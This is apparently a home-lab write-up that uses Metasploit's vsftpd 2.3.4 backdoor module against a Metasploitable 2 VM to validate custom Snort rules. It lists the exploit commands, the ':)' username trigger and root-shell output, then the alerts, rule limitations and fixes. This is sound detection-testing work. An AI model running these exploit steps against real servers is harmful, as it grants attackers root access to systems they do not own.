# MITRE ATT&CK: T1190 - Exploit Public-Facing Application and T1059.004 - Command and Scripting Interpreter: Unix Shell

## Objective:
Simulating the vsftpd backdoor against an FTP server in Metasploitable 2 to test Snort rules with sid 1000002 and 1000003.

## Environment:
- Attacker: Kali (172.30.1.20)
- Target: Metasploitable 2 (172.30.1.28)
- Services: FTP (port 21); VSFTPD Backdoor (port 6200) 
- Tool Used: Metasploit Framework (vsftpd backdoor)

## Prerequisites
- FTP on Metasploitable 2 (default)
- Snort running with sid 1000002 and 1000003 active
  
## What The Attack Does
The vsftpd exploits a backdoor triggered by sending :) in the FTP username field, which opens a root shell on port 6200l.

## Commands Used
- (on Kali):
  - msfconsole
  - use exploit/unix/ftp/vsftpd_234_backdoor
  - set RHOSTS <target-ip>
  - exploit

## Attacker Perspective
- msfconsole output:
  - msf > use exploit/unix/ftp/vsftpd_234_backdoor
  - msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.30.1.28 RHOSTS ⇒ 172.30.1.28
  - msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
  - [*] 172.30.1.28:21 - Banner: 220 (vsFTPd 2.3.4)
  - [*] 172.30.1.28:21 - USER: 331 Please specify the password.
  - [+] 172.30.1.28:21 - UID: uid=0(root) gid=0(root)
  - [*] Found shell.
  - [*] Command shell session 1 opened (172.30.1.20:40999 → 172.30.1.28:6200) at (date & time)
This backdoor is particulary dangerous because the average person wouldn't know something like this exists in a program/package they downloaded. With root access, an attacker has full access to the operating system and can do any number of things including stealing your files/data or installing malware. A supply chain compromise such as this can easily affect people who download the package because to them, what they're downloading appears to be unaltered at first.

## Defender Perspective
Snort output: 
  - 06/11-23:50:35.886612 [**] [1:1000003:1] BACKDOOR CONNECTION DETECTED [**] [Priority: 0] {TCP} 172.30.1.20:39457 -> 172.30.1.28:6200
  - 06/11-23:50:35.920247 [**] [1:1000002:1] BACKDOOR TRIGGER DETECTED [**] [Priority: 0] {TCP} 172.30.1.20:41895 -> 172.30.1.28:21
  - 06/11-23:50:35.930943 [**] [1:498:6] ATTACK-RESPONSES id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 172.30.1.28:6200 -> 172.30.1.20:38131
The first 2 Snort outputs are the implemented rules working as expected, with the backdoor trigger on port 21 and the root shell connection on port 6200, the third output is a built-in Snort rule that detects a string that indicates a root shell was returned.

## Detection Validated
The implemented rules fired off as expected, detecting both the backdoor trigger, along with the root shell creation and connection.

## Limitations Observed
Some of the limitations found with the rules is that a username longer than 100 characters could not trigger the first rule, and because of "flow:stateless", if there's a legitimate service running on port 6200, then the second rule fires on any packet to that port for the duration of the session. In a more likely real-world scenario, there wouldn't be a worry for extremely long usernames, but it is a technical limitation of how the rule is currently written.

## Lessons Learned
When testing these rules, I expected the first rule that detects the backdoor trigger to fire first, but it doesn't because "flow:established" requires the 3-way handshake on port 21 to complete before Snort will match the rule, while rule 2 checks for the first sign of any traffic on port 6200. Another MITRE technique which relates to this backdoor is T1195, Supply Chain Compromise. This backdoor was created in the first place because the source package for vsftpd was altered to this malicious version that contains the backdoor.

## Recommendations
- The first rule could be configured to detect longer usernames, although it would be highly unlikely in a regular case
- The second rule could be altered to detect specific packets on port 6200 instead of all traffic to prevent false positives

## References
- MITRE ATT&CK T1190: https://attack.mitre.org/techniques/T1190/
- MITRE ATT&CK T1059.004: https://attack.mitre.org/techniques/T1059/004/
- Snort Rule Documentation: https://docs.snort.org/
